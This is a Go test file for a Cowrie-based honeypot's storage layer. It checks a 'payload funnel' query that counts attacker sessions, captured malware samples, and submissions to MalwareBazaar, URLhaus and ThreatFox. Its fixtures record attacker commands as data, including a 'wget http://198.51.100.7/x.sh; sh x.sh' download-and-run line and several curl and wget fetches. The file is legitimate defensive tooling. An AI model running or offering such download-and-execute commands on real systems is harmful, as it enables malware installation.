package store

import (
	"context"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func funnelEventFrom(t *testing.T, s *Store, ts time.Time, source models.Source, kind models.EventKind, session, command string) int64 {
	t.Helper()
	e := &models.Event{TS: ts, Source: source, Kind: kind, SrcIP: "203.0.113.9", SessionID: session, Command: command}
	if err := s.InsertEvent(e); err != nil {
		t.Fatal(err)
	}
	return e.ID
}

func funnelEvent(t *testing.T, s *Store, ts time.Time, kind models.EventKind, session, command string) {
	t.Helper()
	funnelEventFrom(t, s, ts, models.SourceCowrie, kind, session, command)
}

func funnelArtifact(t *testing.T, s *Store, url, sha, origin string, size int64, first, fetched time.Time) {
	t.Helper()
	if err := s.RecordArtifact(Artifact{TS: fetched, CreatedAt: first, FirstObservedAt: first, LastSuccessfulFetchAt: fetched, URL: url, SHA256: sha, SizeBytes: size, Origin: origin, Status: "fetched"}); err != nil {
		t.Fatal(err)
	}
}

func funnelPolicy() SharePolicy {
	return SharePolicy{MinBytes: 64, Origins: []string{"cowrie_download", "cowrie_file_download", "quarantine_fetch"}}
}

// Every fixture row below exists to make one plausible wrong query fail: a
// per-event count, a missing Cowrie/session filter, a per-row artifact count, a
// per-row "new" judgement, or a dropped legacy branch.
func TestPayloadFunnelCountsEachStage(t *testing.T) {
	s := newTestStore(t, "funnel.db")
	now := time.Now().UTC()
	since := now.Add(-24 * time.Hour)
	in := now.Add(-time.Hour)
	old := now.Add(-48 * time.Hour)
	month := now.Add(-30 * 24 * time.Hour)

	// s1: connect, login, two download commands. s2: connect only (twice).
	// s3: connect, login, recon. s4: an upload with no command.
	// Repeated kinds per session pin COUNT(DISTINCT session_id), not events.
	funnelEvent(t, s, in, models.KindConnect, "s1", "")
	funnelEvent(t, s, in, models.KindAccepted, "s1", "")
	funnelEvent(t, s, in, models.KindCommand, "s1", "cd /tmp; wget http://198.51.100.7/x.sh; sh x.sh")
	funnelEvent(t, s, in, models.KindCommand, "s1", "curl -O http://198.51.100.7/y.sh")
	funnelEvent(t, s, in, models.KindConnect, "s2", "")
	funnelEvent(t, s, in, models.KindConnect, "s2", "")
	funnelEvent(t, s, in, models.KindConnect, "s3", "")
	funnelEvent(t, s, in, models.KindAccepted, "s3", "")
	funnelEvent(t, s, in, models.KindCommand, "s3", "uname -a")
	funnelEvent(t, s, in, models.KindFileUp, "s4", "")
	// s5: a pre-v20 legacy row (ts_unix_ns NULL, offset timestamp) inside the
	// window; dropping the legacy branch loses it.
	legacy := funnelEventFrom(t, s, in, models.SourceCowrie, models.KindConnect, "s5", "")
	if _, err := s.db.Exec("UPDATE events SET ts=?,ts_unix_ns=NULL WHERE id=?", in.In(time.FixedZone("", -5*3600)).Format(time.RFC3339), legacy); err != nil {
		t.Fatal(err)
	}
	// Journal rows (a real-sshd login) and session-less Cowrie rows are not
	// funnel sessions.
	funnelEventFrom(t, s, in, models.SourceJournal, models.KindAccepted, "j1", "")
	funnelEventFrom(t, s, in, models.SourceJournal, models.KindConnect, "j1", "")
	funnelEvent(t, s, in, models.KindConnect, "", "")
	funnelEvent(t, s, in, models.KindCommand, "", "wget http://198.51.100.9/z")
	// Outside the window: must not count.
	funnelEvent(t, s, old, models.KindConnect, "s9", "")
	funnelEvent(t, s, old, models.KindCommand, "s9", "curl https://198.51.100.8/y")

	pol := funnelPolicy()
	// aaaa: new + captured, recorded twice (two URLs) — counts once.
	funnelArtifact(t, s, "http://198.51.100.7/x.sh", "aaaa", "quarantine_fetch", 900, in, in)
	funnelArtifact(t, s, "http://198.51.100.7/x2.sh", "aaaa", "quarantine_fetch", 900, in, in)
	// bbbb: captured, not new. The in-window row claims a first observation
	// of `in`, but an older row of the same hash was first seen a month ago:
	// "new" is per hash (earliest observation), not per row.
	funnelArtifact(t, s, "cowrie-download:bbbb", "bbbb", "cowrie_download", 4096, in, in)
	funnelArtifact(t, s, "cowrie-download:bbbb-old", "bbbb", "cowrie_download", 4096, month, month)
	funnelArtifact(t, s, "cowrie-tty:cccc", "cccc", "cowrie_tty", 9000, in, in)         // tty: excluded
	funnelArtifact(t, s, "cowrie-download:dddd", "dddd", "cowrie_download", 10, in, in) // < 64 B: excluded

	if err := s.RecordBazaarUpload(BazaarUpload{SHA256: "aaaa", UploadedAt: in, ResponseStatus: "inserted"}); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordBazaarUpload(BazaarUpload{SHA256: "bbbb", UploadedAt: in, ResponseStatus: "file_already_known"}); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordURLhausSubmission("http://198.51.100.7/x.sh", "ok", in); err != nil {
		t.Fatal(err)
	}
	// A pre-v22 ledger row (no exact key yet) is read through the legacy branch.
	if err := s.RecordURLhausSubmission("http://198.51.100.7/y.sh", "ok", in); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec("UPDATE urlhaus_submissions SET submitted_at_key=NULL WHERE url=?", "http://198.51.100.7/y.sh"); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordThreatFoxSubmission("198.51.100.7:80", "ip:port", "elf.mirai", "ok", old); err != nil {
		t.Fatal(err)
	}

	got, err := s.PayloadFunnel(context.Background(), since, pol)
	if err != nil {
		t.Fatal(err)
	}
	want := FunnelCounts{Connected: 4, LoggedIn: 2, RanCommands: 2, DownloadAttempt: 2, Captured: 2, NewPayloads: 1, SharedBazaar: 1, SharedURLhaus: 2, SharedThreatFox: 0}
	if got != want {
		t.Fatalf("funnel = %+v, want %+v", got, want)
	}
}

// RecordArtifactObservation writes status=fetched with no fetch time. Such a
// row is not captured (the share path cannot see it), so it must not surface
// as new either: NewPayloads is a subset of Captured.
func TestPayloadFunnelNewIsSubsetOfCaptured(t *testing.T) {
	s := newTestStore(t, "funnel-subset.db")
	now := time.Now().UTC()
	if err := s.RecordArtifactObservation(Artifact{TS: now, FirstObservedAt: now, URL: "cowrie-download:ffff", SHA256: "ffff", SizeBytes: 4096, Origin: "cowrie_download", Status: "fetched"}); err != nil {
		t.Fatal(err)
	}
	got, err := s.PayloadFunnel(context.Background(), now.Add(-time.Hour), funnelPolicy())
	if err != nil {
		t.Fatal(err)
	}
	if got.NewPayloads > got.Captured || got.Captured != 0 {
		t.Fatalf("observation-only row: want Captured=0 and NewPayloads<=Captured, got %+v", got)
	}
}

// A hash first observed under a non-shareable origin is not new when a
// shareable fetch of the same bytes arrives later.
func TestPayloadFunnelNewJudgesEveryRowOfTheHash(t *testing.T) {
	s := newTestStore(t, "funnel-anyorigin.db")
	now := time.Now().UTC()
	in := now.Add(-time.Hour)
	funnelArtifact(t, s, "cowrie-tty:gggg", "gggg", "cowrie_tty", 4096, now.Add(-72*time.Hour), now.Add(-72*time.Hour))
	funnelArtifact(t, s, "http://198.51.100.7/g", "gggg", "quarantine_fetch", 4096, in, in)
	got, err := s.PayloadFunnel(context.Background(), now.Add(-24*time.Hour), funnelPolicy())
	if err != nil {
		t.Fatal(err)
	}
	if got.Captured != 1 || got.NewPayloads != 0 {
		t.Fatalf("want Captured=1 NewPayloads=0, got %+v", got)
	}
}

func TestPayloadFunnelZeroPolicyCapturesNothing(t *testing.T) {
	s := newTestStore(t, "funnel-zero.db")
	now := time.Now().UTC()
	funnelArtifact(t, s, "cowrie-download:eeee", "eeee", "cowrie_download", 4096, now, now)
	got, err := s.PayloadFunnel(context.Background(), now.Add(-time.Hour), SharePolicy{})
	if err != nil {
		t.Fatal(err)
	}
	if got.Captured != 0 || got.NewPayloads != 0 {
		t.Fatalf("a zero SharePolicy must select nothing (fail closed), got %+v", got)
	}
}

func TestPayloadFunnelHonoursCancellation(t *testing.T) {
	s := newTestStore(t, "funnel-cancel.db")
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := s.PayloadFunnel(ctx, time.Now().Add(-time.Hour), SharePolicy{MinBytes: 64, Origins: []string{"quarantine_fetch"}}); err == nil {
		t.Fatal("a cancelled context must abort the funnel query")
	}
}
